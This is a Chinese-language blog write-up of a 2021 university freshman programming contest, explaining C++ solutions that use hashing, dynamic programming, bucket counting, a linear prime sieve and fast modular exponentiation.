<h3 id="万能头文件"><a href="#万能头文件" class="headerlink" title="万能头文件"></a>万能头文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>包括了基本所有的头文件，，，方便使用。</p>
<p><a href="https://blog.csdn.net/prime_lee/article/details/80489284" target="_blank" rel="noopener">具体查看里面都有什么头文件请查看</a></p>
<h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><p>功能：初始化函数，将某一块内存中的内容全部设置为指定的值</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;//emm</span></span></span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">-1</span>,<span class="keyword">sizeof</span>(vis));</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数：初始化数组</li>
<li>第二个参数：赋的值</li>
<li>第三个参数：大小</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">30</span>];<span class="comment">//存放某一字符(下标) 对应 转换的字符[存的只是1234...]</span></span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; id;<span class="comment">//存放某类字符串，，，是否出现过</span></span><br><span class="line"><span class="keyword">int</span> tot;<span class="comment">//存放出现过的字符类的数目</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span>;<span class="comment">//数组初始化，必须是const</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; e[N];<span class="comment">//存放的是，对应类字符串的下标</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">tran</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">-1</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">-1</span>;<span class="comment">//从a开始轮到的字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(vis[s[i] - <span class="string">'a'</span>] == <span class="number">-1</span>)&#123;<span class="comment">//该字符串还没转换</span></span><br><span class="line">            vis[s[i] - <span class="string">'a'</span>] = ++cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        s[i] = vis[s[i] - <span class="string">'a'</span>] + <span class="string">'a'</span>;<span class="comment">//变成字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> id,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> upper_bound(e[id].<span class="built_in">begin</span>(),e[id].<span class="built_in">end</span>(),r) - lower_bound(e[id].<span class="built_in">begin</span>(),e[id].<span class="built_in">end</span>(),l);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,q;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n ; ++i) &#123;<span class="comment">//这里要从1开始，因为l和r是从1开始，用来计算的下标也应是从1开始的</span></span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        s = tran(s);<span class="comment">//输入的字符串都进行转换</span></span><br><span class="line">        <span class="keyword">if</span>(!id[s])&#123;<span class="comment">//该类字符串没有出现过</span></span><br><span class="line">            id[s] = ++tot;</span><br><span class="line">        &#125;</span><br><span class="line">        e[id[s]].push_back(i);<span class="comment">//存入下标</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (q--)&#123;</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">        s = tran(s);</span><br><span class="line">        <span class="keyword">if</span>(!id[s])&#123;<span class="comment">//这类字符串没有出现过</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">get</span>(id[s],l,r)&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//通过大于区间 减去 小于 区间的，，，得到属于区间的个数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="B-暗号2"><a href="#B-暗号2" class="headerlink" title="B 暗号2"></a>B 暗号2</h2><blockquote>
<p><del>当时看第二题，，，一看对其做hash，感觉还好，，，好吧，我对什么感觉都还好，，但是不会做TATATAT</del></p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>使用动态规划dp来做，，，【只能说我看懂了， 能不能想到就难说了】</p>
<ol>
<li><code>dp[i][j]</code>表示<code>长度为i,bash值为j</code>的字符串有几个【第一个长度是len，21即可；第二个长度是p的最大值，100001即可】                                    初值：<code>dp[0][0] = 1</code></li>
<li>对于长度为i的字符串，它是长度为i-1的字符串（令hash值为j【因为hash值对p求余，故hash值小于p】）加上一个字符<code>k∈[0,26)</code>得到的，故得到最终的hash值是<code>（j*base+k）%p</code></li>
<li>长度为i的hash值如上，它的值是：<code>dp[i][v] = dp[i][v] + dp[i-1][j];</code>，</li>
<li>最后，输出的结果是<code>dp[n][hashsum]</code></li>
</ol>
<h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i:s)</span><br></pre></td></tr></table></figure>

<h3 id="auto"><a href="#auto" class="headerlink" title="auto"></a>auto</h3><p>功能：根据后面的值,来自己推测前面的类型是什么。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">21</span>][<span class="number">100001</span>];       <span class="comment">//dp的数组</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> base,p,n;         <span class="comment">//最后都设为long long</span></span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;base&gt;&gt;p&gt;&gt;n&gt;&gt;s;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> hashsum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i:s) hashsum = (hashsum*base+i-<span class="string">'a'</span>)%p; <span class="comment">//求输入s的hash值</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;               <span class="comment">//设初值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;              <span class="comment">//这个一致即可</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; p; ++j) &#123;           <span class="comment">//hash值最大不超过p</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k) &#123;      <span class="comment">//补上最后一位的字符</span></span><br><span class="line">                <span class="keyword">int</span> v = (j * base + k) % p;     <span class="comment">//计算hash</span></span><br><span class="line">                dp[i][v] += dp[i<span class="number">-1</span>][j];         <span class="comment">//计算个数</span></span><br><span class="line">                dp[i][v] %= mod;                <span class="comment">//求余</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[n][hashsum]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="C-3-6数对"><a href="#C-3-6数对" class="headerlink" title="C 3.6数对"></a>C 3.6数对</h2><blockquote>
<p>题目是比较简单的，，，，比赛的时候也做出来了。。。但是题解更有意思，，，，提供一种思路</p>
</blockquote>
<h3 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> time=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>()<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; v.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(v[i] == <span class="number">2</span>*v[j] || v[i]*<span class="number">2</span> == v[j])&#123;<span class="comment">//一步一步判断，，，比较慢</span></span><br><span class="line">                time++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> n1;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n1;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span><span class="params">(n1,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n1; ++j) &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;v[j];</span><br><span class="line">        &#125;check(v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题解【桶排】"><a href="#题解【桶排】" class="headerlink" title="题解【桶排】"></a>题解【桶排】</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>使用数组下标表示值，因为最大值才100，开辟一个101的数组空间即可</li>
<li>输入一个数x，让a[x]++，让数组里面存储下标对应的个数</li>
<li>最后ans是用循环+<code>a[i] * a[i*2]</code>得到的，因为多个值的话，其实就是乘积</li>
</ol>
<blockquote>
<p>高级，，，这种方法又称作桶排。</p>
<p><img src="/2021/04/18/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A62021%E5%B1%8A%E6%96%B0%E7%94%9F%E8%B5%9B/image-20210321212749117.png" alt="image-20210321212749117"></p>
</blockquote>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">101</span>];<span class="comment">//因为输入的数最大为100，用一个100大小的空间即可</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;<span class="comment">//测试数据的写法</span></span><br><span class="line">        <span class="keyword">int</span> n;<span class="comment">//数组长度</span></span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));<span class="comment">//必须置0,避免影响其他轮数的计算</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;<span class="comment">//输入n组数据</span></span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">            a[x]++;<span class="comment">//用下标表示数字，用数组表示有几个。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">50</span> ; ++i) &#123;</span><br><span class="line">            ans += a[i] * a[i*<span class="number">2</span>];<span class="comment">//好想法。。。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="D-圆的交点"><a href="#D-圆的交点" class="headerlink" title="D 圆的交点"></a>D 圆的交点</h2><blockquote>
<p><del>思维题，，哭哭，好嘛，我也想过，只不过没想明白</del>  orz~~</p>
</blockquote>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>分为三种情况：</p>
<ol>
<li>相邻的交点</li>
</ol>
<p><img src="/2021/04/18/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A62021%E5%B1%8A%E6%96%B0%E7%94%9F%E8%B5%9B/image-20210322142735301.png" alt="image-20210322142735301"></p>
<p>两两相交，交点有两个</p>
<p>组合方式计算：</p>
<p>a.一排横着两两相交：a种</p>
<p>b.共有b+1排</p>
<p>故此情况为a*(b+1)</p>
<p>同理，纵向两两相交：b种，共有a+1排</p>
<p>故此情况共有交点:<code>2*[a*(b+1)+b*(a+1)]</code></p>
<hr>
<p>2.斜对面</p>
<p><img src="/2021/04/18/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A62021%E5%B1%8A%E6%96%B0%E7%94%9F%E8%B5%9B/image-20210322143100339.png" alt="image-20210322143100339"></p>
<p>这种情况，交点都在圆心处，，</p>
<hr>
<ol start="3">
<li>相切</li>
</ol>
<p><img src="/2021/04/18/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A62021%E5%B1%8A%E6%96%B0%E7%94%9F%E8%B5%9B/image-20210322143132384.png" alt="image-20210322143132384"></p>
<p>交点也都在圆心处，，，</p>
<p>所以，所有的圆心都是交点，也就是(a+1)*(b+1)，也就是所有圆的个数</p>
<hr>
<p>综上：所以最终答案为<code>2*[a*(b+1)+b*(a+1)]+(a+1)*(b+1)</code></p>
<hr>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-22.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> a,b;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(<span class="number">2</span>*( a*(b+<span class="number">1</span>) + b*(a+<span class="number">1</span>) ) + (a+<span class="number">1</span>)*(b+<span class="number">1</span>))%mod&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="E-孪生质数"><a href="#E-孪生质数" class="headerlink" title="E 孪生质数"></a>E 孪生质数</h2><blockquote>
<p><del>emm，这道题，，，，是真的搞不出来，虽然答案能算，但是超时，惨兮兮，涉及知识点盲区</del></p>
<p>设计了筛法计算质数，快速幂还有逆元（就是a的逆，，，），一个个来说说。</p>
</blockquote>
<h3 id="筛法求质数"><a href="#筛法求质数" class="headerlink" title="筛法求质数"></a>筛法求质数</h3><blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1va4y1J7pb?from=search&seid=11299170599845424315" target="_blank" rel="noopener">[Rocky]埃氏筛与欧拉筛-C++竞赛级入门第十四节</a></li>
<li><a href="https://blog.csdn.net/qq_39763472/article/details/82428602" target="_blank" rel="noopener">欧拉筛法（线性筛）的学习理解</a></li>
<li><a href="https://www.luogu.com.cn/blog/hahahage/ou-la-shai-fa" target="_blank" rel="noopener">欧拉筛法</a></li>
</ul>
</blockquote>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>普通的求质数方法：两层循环，通过判断该数能否被从1开始的任意数整除，如果可以的话，为合数；都不可的话，为质数；</p>
<p>改进的普通筛法：已知2是质数，则令它与2，3，4…相乘得到的数都是合数，它的复杂度为O(NloglogN)</p>
<p>欧拉筛法：又称线性筛，它的时间复杂度为O(n)，普通筛法有问题是，同样的一个数，如24，他既会被2筛，也会被3、4、6、8、12筛掉，不好，所以它改进为一个合数只被它最小的质因数筛掉。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e7</span>+<span class="number">1e3</span>;</span><br><span class="line"><span class="keyword">bool</span> ok[N];<span class="comment">//用来进行筛选的数组</span></span><br><span class="line"><span class="keyword">int</span> prim[N];<span class="comment">//存有所有的质数</span></span><br><span class="line"><span class="keyword">int</span> pos=<span class="number">0</span>;<span class="comment">//代表当前质数的个数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; N;++i) &#123;<span class="comment">//质数是从2-N</span></span><br><span class="line">        <span class="keyword">if</span>(ok[i] == <span class="number">0</span>)&#123;<span class="comment">//0表示是质数</span></span><br><span class="line">            prim[pos++] = i;<span class="comment">//将该质数加入到prim数组中.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里是为了将最小质因数为i的其他合数都进行标记</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pos; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i*prim[j] &gt; N)<span class="comment">//超过范围</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ok[i*prim[j]] = <span class="number">1</span>;<span class="comment">//标记</span></span><br><span class="line">            <span class="keyword">if</span>(i%prim[j] == <span class="number">0</span>)<span class="comment">//如果prim[j]刚好是i的最小质因数,所以其他时候,i不是最小质因数,prim[j]可以代替它,故退出</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>求解a^b（以2^10为例），步骤如下：</p>
<ol>
<li>a = 2，b = 10（1010b【二进制表示】）</li>
<li><code>2^10 = 2^(2^0*0 + 2^1*1 + 2^2*0 + 2^3*1</code></li>
</ol>
<p>下面的代码正是基于上面的思路：</p>
<p>若a为2，b = 10(1010b)</p>
<ol>
<li><p>初始 a = 2,b = 1010b，ans = 1；</p>
</li>
<li><p>第一次循环，因为b最低位不为1，故a = a ^ 2，ans = 1；</p>
<p>b右移，b = 101，继续循环</p>
</li>
<li><p>第二次循环，因为b = 101，最低位为1，故ans = a ^ 2，a = a^4</p>
<p>b右移，b = 10，继续循环</p>
</li>
<li><p>第三次循环，因为b = 10，最低位不为1，故ans = a^2，a = a^8</p>
<p>b右移，b = 1，继续循环</p>
</li>
<li><p>第四次循环，因为b = 1，最低位为1，故ans = a^2 * a^8 = a^10 , a=a^16</p>
<p>b继续右移，b=0，循环结束</p>
</li>
</ol>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算a^b</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qmod</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;<span class="comment">//首先判断b有没有</span></span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">1</span>)<span class="comment">//如果b低位为1</span></span><br><span class="line">            ans = ans*a%mod;<span class="comment">//在结果中加入</span></span><br><span class="line">        a = a*a%mod;<span class="comment">//a继续</span></span><br><span class="line">        b&gt;&gt;=<span class="number">1</span>;<span class="comment">//b继续右移</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="本题求解"><a href="#本题求解" class="headerlink" title="本题求解"></a>本题求解</h3><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><ol>
<li><p>首先根据筛法求质数，将所有的质数保存在prim数组中</p>
</li>
<li><p>循环prim数组，找到所有的孪生质数，保存在a数组（向量）中</p>
</li>
<li><p>因为抽中的概率就是<br>$$<br>{k} \over C{2 \atop n}<br>$$<br>k表示的是孪生质数的对数</p>
<p>化简为<br>$$<br>2*k \over n * (n-1)<br>$$</p>
</li>
<li><p>根据vector，容易得到k</p>
</li>
<li><p>剩余1/(n*n-1)，要求mod，，，需要快速幂，然后按着公式直接计算即可得到结果</p>
</li>
</ol>
